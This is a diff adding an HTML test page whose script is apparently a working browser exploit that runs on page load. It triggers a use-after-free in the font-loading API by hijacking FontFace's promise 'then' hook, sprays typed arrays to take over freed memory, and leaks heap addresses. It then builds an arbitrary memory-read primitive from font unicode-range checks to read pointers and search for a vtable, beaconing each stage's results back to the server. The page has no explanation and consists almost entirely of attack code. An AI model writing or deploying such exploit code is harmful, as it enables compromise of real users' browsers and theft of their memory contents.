@@ -1,0 +1,219 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7i</title></head>
+<body><pre id="O">T7i</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7i-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;
+
+function le48(v,o){return v[o]+v[o+1]*0x100+v[o+2]*0x10000+v[o+3]*0x1000000+v[o+4]*0x100000000+v[o+5]*0x10000000000;}
+function hex(x){return '0x'+Math.round(x).toString(16);}
+function hx(x){return x.toString(16);}
+function wr48(u,o,x){for(var k=0;k<6;k++){u[o+k]=x%256;x=Math.floor(x/256);}u[o+6]=0;u[o+7]=0;}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+function align256(x){return Math.floor(x/256)*256;}
+
+window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+      w[0x82]=3;
+      w[0x38]=0x00;w[0x39]=0x10;w[0x3A]=0x00;w[0x3B]=0x00;
+      w[0x3C]=0x00;w[0x3D]=0x20;w[0x3E]=0x00;w[0x3F]=0x00;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,100);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0,L2=0;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le48(window.__sp[i],0x58);
+    if(a>0x1000000000){
+      var b2=le48(window.__sp[i],0x68);
+      if(L1===0){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+  var h0=bufs[0][0];
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;wr48(vb,0x08,bufs[ib][1]);wr48(vb,0x10,0);vb[0x82]=0;
+    wr48(vb,0x20,0);put32(vb,0x28,0);put32(vb,0x2C,0);
+  }
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      setTimeout(function(){
+        var zi=-1;
+        for(var q=0;q<faces.length;q++){
+          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+          if(r===false){zi=q;break;}
+        }
+        bs('ZI='+zi);
+        if(zi<0){bs('NOORACLE');return;}
+
+        function setR(addr){for(var ir=0;ir<bufs.length;ir++)wr48(bufs[ir][0],0x20,addr);}
+        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}
+
+        for(var ip=0;ip<bufs.length;ip++){
+          bufs[ip][0][0x82]=0;
+          put32(bufs[ip][0],0x38,0x1000);put32(bufs[ip][0],0x3C,0x2000);
+          wr48(bufs[ip][0],0x20,L2);
+          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
+        }
+
+        bs('SCAN1');
+        var self=0,n3=0;
+        var anchors=[align256(L1),align256(L2)];
+        for(var an=0;an<anchors.length&&!self;an++){
+          var cS=anchors[an]-0x400000,cE=anchors[an]+0x400000;
+          if(cS<0x10000)cS=0x10000;
+          for(var a=cS;a<cE&&!self;a+=128){
+            setR(a+0x38);n3++;
+            if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+              self=a;bs('SELF='+hex(a));
+            }
+          }
+        }
+        bs('SCAN1-END-n='+n3);
+        if(!self){bs('NOSELF');}
+
+        function rr(addr){
+          setR(addr);
+          var c0=chk(0),cM=chk(0x10FFFF);
+          if(c0&&cM)return[0,0x10FFFF];
+          if(c0){
+            var lo=0,hi=0x10FFFF;
+            while(lo<hi){var m=(lo+hi+1)>>>1;if(chk(m))lo=m;else hi=m-1;}
+            return[0,lo];
+          }
+          if(cM){
+            var lo2=0,hi2=0x10FFFF;
+            while(lo2<hi2){var m2=(lo2+hi2)>>>1;if(chk(m2))hi2=m2;else lo2=m2+1;}
+            return[lo2,0x10FFFF];
+          }
+          var seed=-1,v=1;
+          while(v<=0x10FFFF){
+            if(chk(v)){seed=v;break;}
+            var v3=v+v+v;
+            if(v3<=0x10FFFF&&chk(v3)){seed=v3;break;}
+            v=v*2;
+          }
+          if(seed<0)return[-2,-2];
+          var lo3=0,hi3=seed;
+          while(lo3<hi3){var m3=(lo3+hi3)>>>1;if(chk(m3))hi3=m3;else lo3=m3+1;}
+          var fr=lo3;
+          var lo4=seed,hi4=0x10FFFF;
+          while(lo4<hi4){var m4=(lo4+hi4+1)>>>1;if(chk(m4))lo4=m4;else hi4=m4-1;}
+          return[fr,lo4];
+        }
+
+        function rf(r){return r[0]===-2?'E':hx(r[0])+'/'+hx(r[1]);}
+
+        // Phase A: Extract WPI (3 rr calls)
+        bs('A');
+        var s6_0=rr(L2+6);
+        bs('s6='+rf(s6_0));
+        var WPI=0;
+        if(s6_0[0]!==-2 && !(s6_0[0]===0&&s6_0[1]===0x10FFFF)){
+          var uf=s6_0[0],ut=s6_0[1];
+          var wb0=(uf>>>16)&0xFF,wb1=(uf>>>24)&0xFF;
+          var wb2=ut&0xFF,wb3=(ut>>>8)&0xFF,wb4=(ut>>>16)&0xFF,wb5=(ut>>>24)&0xFF;
+          WPI=wb0+wb1*256+wb2*65536+wb3*16777216+wb4*4294967296+wb5*1099511627776;
+          bs('WPI='+hex(WPI));
+        }
+        // Confirm with s4[0]
+        bs('s4='+rf(rr(L2+4)));
+        // L2+0x18 s4 for context
+        bs('L2+18.s4='+rf(rr(L2+0x1C)));
+
+        if(WPI<0x1000000000){bs('NO-WPI');bs('DONE');
+          put32(h0,0x38,0x1000);put32(h0,0x3C,0x2000);if(self)setR(self+0x38);
+          document.getElementById('O').textContent='T7i NO-WPI';return;}
+
+        // Phase B: Deref ptr@WPI+0 via s6 at WPI-2 (1 rr call)
+        bs('B');
+        var wm2=rr(WPI-2);
+        bs('Wm2='+rf(wm2));
+        var WPI2=0;
+        if(wm2[0]!==-2 && !(wm2[0]===0&&wm2[1]===0x10FFFF)){
+          var pf=wm2[0],pt=wm2[1];
+          var pb0=(pf>>>16)&0xFF,pb1=(pf>>>24)&0xFF;
+          var pb2=pt&0xFF,pb3=(pt>>>8)&0xFF,pb4=(pt>>>16)&0xFF,pb5=(pt>>>24)&0xFF;
+          WPI2=pb0+pb1*256+pb2*65536+pb3*16777216+pb4*4294967296+pb5*1099511627776;
+          bs('W2='+hex(WPI2)+'-b='+hx(pb0)+'.'+hx(pb1)+'.'+hx(pb2)+'.'+hx(pb3)+'.'+hx(pb4)+'.'+hx(pb5));
+        } else {
+          bs('W2-opaque='+rf(wm2));
+        }
+
+        // Phase C: Check byte[4] at WPI offsets 0,8,10,18 (4 rr calls)
+        bs('C');
+        var scanOff=[0,8,0x10,0x18];
+        for(var si=0;si<scanOff.length;si++){
+          var sv=rr(WPI+scanOff[si]+4);
+          bs('W+'+hx(scanOff[si])+'.4='+rf(sv));
+        }
+
+        // Phase D: Follow WPI2 if valid (up to 3 rr calls)
+        bs('D');
+        if(WPI2>0x1000000000){
+          var w2s4=rr(WPI2+4);
+          bs('W2.s4='+rf(w2s4));
+          var w2s2=rr(WPI2+2);
+          bs('W2.s2='+rf(w2s2));
+          if(w2s4[0]===8){
+            bs('W2-VTABLE-HIT');
+            var w2m2=rr(WPI2-2);
+            bs('W2m2='+rf(w2m2));
+          }
+        } else {
+          bs('W2-FAIL');
+        }
+
+        // Phase E: L2+0x18 ptr extraction (1 rr call)
+        bs('E');
+        var l2d=rr(L2+0x16);
+        bs('L2.16='+rf(l2d));
+
+        // Phase F: L1 bytes[0,1] (1 rr call)
+        bs('F');
+        var l1m=rr(L1-2);
+        bs('L1m2='+rf(l1m));
+
+        // Restore oracle
+        put32(h0,0x38,0x1000);put32(h0,0x3C,0x2000);
+        if(self)setR(self+0x38);
+
+        bs('DONE');
+        document.getElementById('O').textContent='T7i DONE';
+      },50);
+    },50);
+  },50);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
